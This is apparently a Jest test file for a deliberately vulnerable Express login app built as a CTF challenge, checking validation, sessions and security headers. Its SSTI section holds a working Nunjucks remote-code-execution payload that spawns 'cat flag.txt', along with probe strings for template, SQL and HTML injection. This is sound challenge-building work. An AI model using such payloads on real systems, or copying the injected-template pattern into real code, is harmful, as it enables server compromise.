const request = require('supertest');
const { app, users } = require('./app');

// Helper: sign up a user and return the agent with session cookies
async function signupUser(agent, { firstname = 'John', lastname = 'Doe', email = 'test@test.com', password = 'password123' } = {}) {
  return agent
    .post('/signup')
    .type('form')
    .send({ firstname, lastname, email, password, confirm_password: password });
}

// Helper: sign in and return the agent with session cookies
async function signinUser(agent, { email = 'test@test.com', password = 'password123' } = {}) {
  return agent
    .post('/signin')
    .type('form')
    .send({ email, password });
}

beforeEach(() => {
  users.clear();
});

// ============================================================
// Root redirect
// ============================================================
describe('GET /', () => {
  test('redirects unauthenticated user to /signin', async () => {
    const res = await request(app).get('/');
    expect(res.status).toBe(302);
    expect(res.headers.location).toBe('/signin');
  });

  test('redirects authenticated user to /home', async () => {
    const agent = request.agent(app);
    await signupUser(agent);
    const res = await agent.get('/');
    expect(res.status).toBe(302);
    expect(res.headers.location).toBe('/home');
  });
});

// ============================================================
// Signup page
// ============================================================
describe('GET /signup', () => {
  test('renders signup form', async () => {
    const res = await request(app).get('/signup');
    expect(res.status).toBe(200);
    expect(res.text).toContain('Create Account');
    expect(res.text).toContain('First Name');
    expect(res.text).toContain('Last Name');
  });
});

// ============================================================
// Signup POST
// ============================================================
describe('POST /signup', () => {
  test('successful signup redirects to /home', async () => {
    const agent = request.agent(app);
    const res = await signupUser(agent);
    expect(res.status).toBe(302);
    expect(res.headers.location).toBe('/home');
  });

  test('sets session after signup (can access /home)', async () => {
    const agent = request.agent(app);
    await signupUser(agent);
    const res = await agent.get('/home');
    expect(res.status).toBe(200);
    expect(res.text).toContain('Hello John Doe!');
  });

  test('stores user in memory', async () => {
    const agent = request.agent(app);
    await signupUser(agent, { email: 'store@test.com' });
    expect(users.has('store@test.com')).toBe(true);
    expect(users.get('store@test.com').fullname).toBe('John Doe');
  });

  test('hashes password (not stored in plaintext)', async () => {
    const agent = request.agent(app);
    await signupUser(agent, { email: 'hash@test.com', password: 'mysecretpw' });
    const user = users.get('hash@test.com');
    expect(user.password).not.toBe('mysecretpw');
    expect(user.password).toMatch(/^\$2[aby]\$/);
  });

  // --- Validation ---
  test('rejects missing firstname', async () => {
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ lastname: 'Doe', email: 'a@b.com', password: 'password123', confirm_password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('All fields are required.');
  });

  test('rejects missing lastname', async () => {
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'John', email: 'a@b.com', password: 'password123', confirm_password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('All fields are required.');
  });

  test('rejects missing email', async () => {
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'John', lastname: 'Doe', password: 'password123', confirm_password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('All fields are required.');
  });

  test('rejects missing password', async () => {
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'John', lastname: 'Doe', email: 'a@b.com', confirm_password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('All fields are required.');
  });

  test('rejects missing confirm_password', async () => {
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'John', lastname: 'Doe', email: 'a@b.com', password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('All fields are required.');
  });

  test('rejects firstname longer than 300 chars', async () => {
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'A'.repeat(301), lastname: 'Doe', email: 'a@b.com', password: 'password123', confirm_password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('Name is too long.');
  });

  test('rejects lastname longer than 300 chars', async () => {
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'John', lastname: 'B'.repeat(301), email: 'a@b.com', password: 'password123', confirm_password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('Name is too long.');
  });

  test('rejects invalid email', async () => {
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'John', lastname: 'Doe', email: 'not-an-email', password: 'password123', confirm_password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('Invalid email address.');
  });

  test('rejects email longer than 254 chars', async () => {
    const longEmail = 'a'.repeat(250) + '@b.com';
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'John', lastname: 'Doe', email: longEmail, password: 'password123', confirm_password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('Invalid email address.');
  });

  test('rejects password shorter than 8 chars', async () => {
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'John', lastname: 'Doe', email: 'a@b.com', password: 'short', confirm_password: 'short' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('Password must be 8-72 characters.');
  });

  test('rejects password longer than 72 chars', async () => {
    const longPw = 'x'.repeat(73);
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'John', lastname: 'Doe', email: 'a@b.com', password: longPw, confirm_password: longPw });
    expect(res.status).toBe(200);
    expect(res.text).toContain('Password must be 8-72 characters.');
  });

  test('rejects mismatched passwords', async () => {
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'John', lastname: 'Doe', email: 'a@b.com', password: 'password123', confirm_password: 'different1' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('Passwords do not match.');
  });

  test('rejects duplicate email', async () => {
    const agent = request.agent(app);
    await signupUser(agent, { email: 'dup@test.com' });

    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'Jane', lastname: 'Doe', email: 'dup@test.com', password: 'password123', confirm_password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('Email already registered.');
  });
});

// ============================================================
// Signin page
// ============================================================
describe('GET /signin', () => {
  test('renders signin form', async () => {
    const res = await request(app).get('/signin');
    expect(res.status).toBe(200);
    expect(res.text).toContain('Welcome Back');
    expect(res.text).toContain('Email');
    expect(res.text).toContain('Password');
  });
});

// ============================================================
// Signin POST
// ============================================================
describe('POST /signin', () => {
  beforeEach(async () => {
    const agent = request.agent(app);
    await signupUser(agent, { email: 'user@test.com', password: 'password123' });
  });

  test('successful signin redirects to /home', async () => {
    const agent = request.agent(app);
    const res = await signinUser(agent, { email: 'user@test.com', password: 'password123' });
    expect(res.status).toBe(302);
    expect(res.headers.location).toBe('/home');
  });

  test('sets session after signin (can access /home)', async () => {
    const agent = request.agent(app);
    await signinUser(agent, { email: 'user@test.com', password: 'password123' });
    const res = await agent.get('/home');
    expect(res.status).toBe(200);
    expect(res.text).toContain('Hello John Doe!');
  });

  test('rejects missing email', async () => {
    const res = await request(app)
      .post('/signin')
      .type('form')
      .send({ password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('All fields are required.');
  });

  test('rejects missing password', async () => {
    const res = await request(app)
      .post('/signin')
      .type('form')
      .send({ email: 'user@test.com' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('All fields are required.');
  });

  test('rejects non-existent email', async () => {
    const res = await request(app)
      .post('/signin')
      .type('form')
      .send({ email: 'nobody@test.com', password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('Invalid email or password.');
  });

  test('rejects wrong password', async () => {
    const res = await request(app)
      .post('/signin')
      .type('form')
      .send({ email: 'user@test.com', password: 'wrongpassword' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('Invalid email or password.');
  });

  test('uses same generic error for wrong email and wrong password', async () => {
    const resBadEmail = await request(app)
      .post('/signin')
      .type('form')
      .send({ email: 'nobody@test.com', password: 'password123' });
    const resBadPass = await request(app)
      .post('/signin')
      .type('form')
      .send({ email: 'user@test.com', password: 'wrongpassword' });

    // Both should show the same generic message (no user enumeration)
    expect(resBadEmail.text).toContain('Invalid email or password.');
    expect(resBadPass.text).toContain('Invalid email or password.');
  });
});

// ============================================================
// Home page
// ============================================================
describe('GET /home', () => {
  test('redirects unauthenticated user to /signin', async () => {
    const res = await request(app).get('/home');
    expect(res.status).toBe(302);
    expect(res.headers.location).toBe('/signin');
  });

  test('shows greeting with fullname for authenticated user', async () => {
    const agent = request.agent(app);
    await signupUser(agent, { firstname: 'Alice', lastname: 'Smith' });
    const res = await agent.get('/home');
    expect(res.status).toBe(200);
    expect(res.text).toContain('Hello Alice Smith!');
  });

  test('shows Dashboard heading', async () => {
    const agent = request.agent(app);
    await signupUser(agent);
    const res = await agent.get('/home');
    expect(res.text).toContain('Dashboard');
  });

  test('shows logout button', async () => {
    const agent = request.agent(app);
    await signupUser(agent);
    const res = await agent.get('/home');
    expect(res.text).toContain('Logout');
    expect(res.text).toContain('action="/logout"');
  });
});

// ============================================================
// Logout
// ============================================================
describe('POST /logout', () => {
  test('redirects to /signin', async () => {
    const agent = request.agent(app);
    await signupUser(agent);
    const res = await agent.post('/logout');
    expect(res.status).toBe(302);
    expect(res.headers.location).toBe('/signin');
  });

  test('destroys session (cannot access /home after logout)', async () => {
    const agent = request.agent(app);
    await signupUser(agent);

    // Verify we can access home
    let res = await agent.get('/home');
    expect(res.status).toBe(200);

    // Logout
    await agent.post('/logout');

    // Now /home should redirect
    res = await agent.get('/home');
    expect(res.status).toBe(302);
    expect(res.headers.location).toBe('/signin');
  });
});

// ============================================================
// Security headers
// ============================================================
describe('Security headers', () => {
  test('sets Content-Security-Policy', async () => {
    const res = await request(app).get('/signin');
    expect(res.headers['content-security-policy']).toBeDefined();
    expect(res.headers['content-security-policy']).toContain("default-src 'self'");
  });

  test('sets X-Content-Type-Options nosniff', async () => {
    const res = await request(app).get('/signin');
    expect(res.headers['x-content-type-options']).toBe('nosniff');
  });

  test('sets X-Frame-Options', async () => {
    const res = await request(app).get('/signin');
    expect(res.headers['x-frame-options']).toBe('SAMEORIGIN');
  });

  test('sets Strict-Transport-Security', async () => {
    const res = await request(app).get('/signin');
    expect(res.headers['strict-transport-security']).toBeDefined();
  });

  test('session cookie is HttpOnly and SameSite=Strict', async () => {
    // POST signup to create session and get Set-Cookie header
    const postRes = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'John', lastname: 'Doe', email: 'cookie@test.com', password: 'password123', confirm_password: 'password123' });
    const postCookie = postRes.headers['set-cookie'];
    expect(postCookie).toBeDefined();
    const cookieStr = Array.isArray(postCookie) ? postCookie.join('; ') : postCookie;
    expect(cookieStr).toMatch(/HttpOnly/i);
    expect(cookieStr).toMatch(/SameSite=Strict/i);
  });
});

// ============================================================
// SSTI Vulnerability (CTF challenge validation)
// ============================================================
describe('SSTI Vulnerability', () => {
  test('template expression {{7*7}} in firstname renders as 49', async () => {
    const agent = request.agent(app);
    await signupUser(agent, { firstname: '{{7*7}}', lastname: 'Test', email: 'ssti1@test.com' });
    const res = await agent.get('/home');
    expect(res.text).toContain('Hello 49 Test!');
  });

  test('template expression {{7*7}} in lastname renders as 49', async () => {
    const agent = request.agent(app);
    await signupUser(agent, { firstname: 'Test', lastname: '{{7*7}}', email: 'ssti2@test.com' });
    const res = await agent.get('/home');
    expect(res.text).toContain('Hello Test 49!');
  });

  test('RCE payload can read flag.txt', async () => {
    const agent = request.agent(app);
    // Uses process.binding('spawn_sync') which works in both direct Node and jest
    const payload = "{{range.constructor(\"var s=process.binding('spawn_sync').spawn({file:'cat',args:['cat','flag.txt'],stdio:[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}]});return s.output[1]+''\")()}}";
    await signupUser(agent, { firstname: payload, lastname: 'X', email: 'ssti3@test.com' });
    const res = await agent.get('/home');
    expect(res.text).toContain('FLAG{s3rv3r_s1d3_t3mpl4t3_1nj3ct10n_m4st3r}');
  });

  test('normal name renders literally without template evaluation', async () => {
    const agent = request.agent(app);
    await signupUser(agent, { firstname: 'John', lastname: 'Doe', email: 'safe@test.com' });
    const res = await agent.get('/home');
    expect(res.text).toContain('Hello John Doe!');
    // Greeting area should contain the literal name, not any evaluated expression
    const greetingMatch = res.text.match(/class="greeting">(.*?)<\/div>/s);
    expect(greetingMatch[1]).toContain('Hello John Doe!');
    expect(greetingMatch[1]).not.toMatch(/\d{2,}/);
  });
});

// ============================================================
// SQL Injection resistance (email field)
// ============================================================
describe('SQL Injection resistance', () => {
  test('email with SQL injection payload is rejected by validation', async () => {
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'John', lastname: 'Doe', email: "' OR 1=1 --", password: 'password123', confirm_password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('Invalid email address.');
  });
});

// ============================================================
// XSS resistance (email in error messages)
// ============================================================
describe('XSS via SSTI path', () => {
  test('HTML in name passes through unescaped due to SSTI vulnerability', async () => {
    // The greeting goes through nunjucks.renderString() then | safe in template,
    // so HTML is NOT escaped — this is part of the SSTI vulnerability surface
    const agent = request.agent(app);
    await signupUser(agent, { firstname: '<b>bold</b>', lastname: 'Doe', email: 'xss@test.com' });
    const res = await agent.get('/home');
    expect(res.text).toContain('<b>bold</b>');
  });

  test('HTML in email is rejected by validation (not an XSS vector)', async () => {
    const res = await request(app)
      .post('/signup')
      .type('form')
      .send({ firstname: 'John', lastname: 'Doe', email: '<script>@x.com', password: 'password123', confirm_password: 'password123' });
    expect(res.status).toBe(200);
    expect(res.text).toContain('Invalid email address.');
  });
});
